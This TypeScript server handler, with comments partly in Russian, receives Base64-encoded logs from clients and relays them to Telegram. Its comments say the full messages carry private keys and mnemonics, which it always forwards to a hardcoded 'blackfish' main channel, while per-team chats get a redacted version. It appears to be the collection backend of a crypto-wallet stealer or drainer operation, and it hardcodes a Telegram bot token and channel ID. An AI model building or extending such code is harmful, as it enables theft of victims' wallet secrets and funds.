import type { FastifyRequest, FastifyReply } from 'fastify';
import type { MessageBody } from './_utils.js';
import {
  isBase64,
  retryWithBackoff,
  fetchWithTimeout,
} from './_utils.js';
import { getPlatformHandler, isSupportedPlatform, getSupportedPlatforms } from './platforms/index.js';
import type { PlatformData } from './platforms/index.js';

// Конфигурация ботов
const BOT_CONFIG = {
  blackfish: {
    token: '8527011591:AAHNTTUvOc3NkZGVgYv-w4Lz_1QRndCNB_Q',
    mainChannelId: '-1003576583871'
  },
} as const;

const WHITELIST = [
  '-1003576583871',
]

type BotId = keyof typeof BOT_CONFIG;
const DEFAULT_BOT_ID: BotId = 'blackfish';


// Helper function to send message to Telegram with retry logic
async function sendTelegramMessage(chatId: string, text: string, botToken: string): Promise<void> {
  try {
    await retryWithBackoff(
      async () => {
        const response = await fetchWithTimeout(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: text,
              parse_mode: 'HTML'
            })
          },
          15000 // 15 second timeout
        );

        if (!response.ok) {
          const errorText = await response.text().catch(() => 'Unknown error');
          throw new Error(`Telegram API error: ${response.status} - ${errorText}`);
        }

        const data = await response.json() as { ok: boolean;[key: string]: any };
        if (!data.ok) {
          throw new Error(`Telegram API returned not ok: ${JSON.stringify(data)}`);
        }

        console.log(`✅ Message sent to Telegram chat ${chatId}`);
      },
      {
        maxRetries: 3,
        initialDelay: 2000,
        onRetry: (error, attempt) => {
          console.log(`⚠️ Retrying sendTelegramMessage to ${chatId}, attempt ${attempt}:`, error.message);
        }
      }
    );
  } catch (error) {
    console.error(`❌ Failed to send Telegram message to ${chatId} after retries:`, error);
    throw error;
  }
}

// Helper function to send log to main channels
// Uses full message with private keys/mnemonics
// Всегда отправляет в главный канал blackfish
// Если botId !== 'blackfish', также отправляет в канал этого бота
async function sendLogToMainChannel(botId: string, username: string, originalChatId: string, fullMessage: string): Promise<void> {
  try {
    const logMessage = `📝<b>Team:</b> ${botId}\n<b>🤖Log From:</b> @${username}\n🎯 <b>Target Channel:</b> <code>${originalChatId}</code>\n\n${fullMessage}`;

    // Всегда отправляем в главный канал blackfish
    const blackfishConfig = BOT_CONFIG.blackfish;
    await sendTelegramMessage(blackfishConfig.mainChannelId, logMessage, blackfishConfig.token);
    console.log(`✅ Log sent to blackfish main channel`);

    // Если botId !== 'blackfish', отправляем также в канал этого бота
    if (botId !== 'blackfish' && botId in BOT_CONFIG) {
      const botConfig = BOT_CONFIG[botId as BotId];
      await sendTelegramMessage(botConfig.mainChannelId, logMessage, botConfig.token);
      console.log(`✅ Log sent to ${botId} main channel`);
    }
  } catch (error) {
    console.error(`❌ Failed to send log to main channel:`, error);
  }
}

export default async function handler(req: FastifyRequest, reply: FastifyReply) {
  if (req.method !== 'POST') {
    return reply.status(405).send({ error: 'Method not allowed' });
  }

  try {
    const body = req.body as MessageBody;

    // Validate request body
    if (!body || !body.chatId) {
      return reply.status(400).send({
        error: 'Invalid request body. Expected: { chatId: string, username: string, platform: string, error: 0|1, message?: string, errorMessage?: string }'
      });
    }

    if (!body || !body.username) {
      return reply.status(400).send({
        error: 'Invalid request body. Expected: { chatId: string, username: string, platform: string, error: 0|1, message?: string, errorMessage?: string }'
      });
    }

    if (!body || !body.platform) {
      return reply.status(400).send({
        error: 'Invalid request body. Expected: { chatId: string, username: string, platform: string, error: 0|1, message?: string, errorMessage?: string }'
      });
    }

    const chatId = body.chatId;
    const username = body.username;
    const platform = body.platform;
    const botId = (body.botId && body.botId in BOT_CONFIG) ? body.botId as BotId : DEFAULT_BOT_ID;
    const botConfig = BOT_CONFIG[botId];
    let messageToSend = '';

    console.log(`🤖 Using bot: ${botId} (token: ${botConfig.token.substring(0, 15)}...)`);

    // Handle error case
    if (body.error === 1) {
      const errorMsg = body.errorMessage || 'Unknown error occurred';
      console.error(`❌ Error received from client (chatId: ${chatId}, username: ${username}, platform: ${platform}):`);
      console.error(`   Error message: ${errorMsg}`);

      messageToSend = `⚠️ <b>Error</b>\n\n${errorMsg}`;

      // Send error to Telegram with error handling
      try {
        await sendTelegramMessage(chatId, messageToSend, botConfig.token);
        console.log(`✅ Error message sent to chat ${chatId}, username ${username}, platform ${platform}`);
      } catch (sendError) {
        console.error(`❌ Failed to send error message to chat ${chatId}, username ${username}, platform ${platform}:`, sendError);
      }

      // Log to main channel
      await sendLogToMainChannel(botId, username, chatId, messageToSend);

      return reply.status(200).send({
        success: true,
        message: 'Error message sent successfully',
        timestamp: new Date().toISOString()
      });
    }

    // Handle success case (error === 0)
    if (!body.message) {
      return reply.status(400).send({
        error: 'Message field is required when error is 0'
      });
    }

    const baseMessage = body.message.trim();
    let messageToSendFull = ''; // Full version for main channel (with private keys)

    console.log(`📨 Received message:`);
    console.log(`   Chat ID: ${chatId}`);
    console.log(`   Username: ${username}`);
    console.log(`   Platform: ${platform}`);
    console.log(`   Message length: ${baseMessage.length} chars`);

    // Проверяем, поддерживается ли платформа
    if (!isSupportedPlatform(platform)) {
      console.error(`❌ Unsupported platform: ${platform}`);
      console.log(`   Supported platforms: ${getSupportedPlatforms().join(', ')}`);
      return reply.status(400).send({
        error: `Unsupported platform: ${platform}`,
        supportedPlatforms: getSupportedPlatforms()
      });
    }

    // Получаем обработчик для платформы
    const platformHandler = getPlatformHandler(platform);
    if (!platformHandler) {
      console.error(`❌ Platform handler not found for: ${platform}`);
      return reply.status(500).send({
        error: `Platform handler not configured: ${platform}`
      });
    }

    console.log(`✅ Using platform handler: ${platformHandler.name}`);

    // Check if message is Base64
    if (isBase64(baseMessage)) {
      try {
        // Decode Base64
        const decodedString = Buffer.from(baseMessage, 'base64').toString('utf-8');
        console.log(`🔓 Decoded Base64 message`);
        console.log(`   Decoded content: ${decodedString.substring(0, 600)}...`);

        // Parse as JSON (общий формат для всех платформ)
        const platformData = JSON.parse(decodedString) as PlatformData;
        console.log(`📊 Platform data:`);
        console.log(`   ${JSON.stringify(platformData, null, 2)}`);

        // Обрабатываем данные через обработчик платформы (каждый handler сам типизирует свои данные)
        const processResult = await platformHandler.processMessage(platformData);
        messageToSend = processResult.messageToSend;
        messageToSendFull = processResult.messageToSendFull;

      } catch (parseError) {
        // If JSON parsing failed, send decoded string as is
        console.log(`⚠️ Failed to parse as JSON, sending decoded string`);
        const decodedString = Buffer.from(baseMessage, 'base64').toString('utf-8');
        messageToSend = `📩 <b>Decoded message:</b>\n\n${decodedString}`;
      }
    } else {
      // Plain text message, send as is
      console.log(`📝 Plain text message received`);
      messageToSend = baseMessage;
    }

    // Send message to Telegram with error handling
    let sendSuccess = false;
    try {
      const isWhitelistChat = WHITELIST.includes(chatId);
      const payloadForChat = (isWhitelistChat && messageToSendFull) ? messageToSendFull : messageToSend;

      if (isWhitelistChat) {
        console.log(`✅ Whitelist chat ${chatId}: отправляем полную версию сообщения`);
      } else {
        console.log(`ℹ️ Обычный чат ${chatId}: отправляем безопасную версию сообщения`);
      }

      await sendTelegramMessage(chatId, payloadForChat, botConfig.token);
      sendSuccess = true;
      console.log(`✅ Message successfully sent to chat ${chatId}, username ${username}, platform ${platform}`);
    } catch (sendError) {
      console.error(`❌ Failed to send message to chat ${chatId}, username ${username}, platform ${platform}:`, sendError);
    }

    // Log to main channel
    // Use full version if available (for wallet messages), otherwise use safe version
    await sendLogToMainChannel(botId, username, chatId, messageToSendFull || messageToSend);

    return reply.status(200).send({
      success: sendSuccess,
      message: sendSuccess ? 'Message processed and sent successfully' : 'Message processed but failed to send to chat',
      timestamp: new Date().toISOString(),
      messageType: isBase64(baseMessage) ? 'base64' : 'plain',
      messageLength: baseMessage.length
    });
  } catch (error) {
    console.error('❌ Error processing message:', error);
    return reply.status(500).send({
      error: 'Failed to process message',
      details: error instanceof Error ? error.message : 'Unknown error'
    });
  }
}
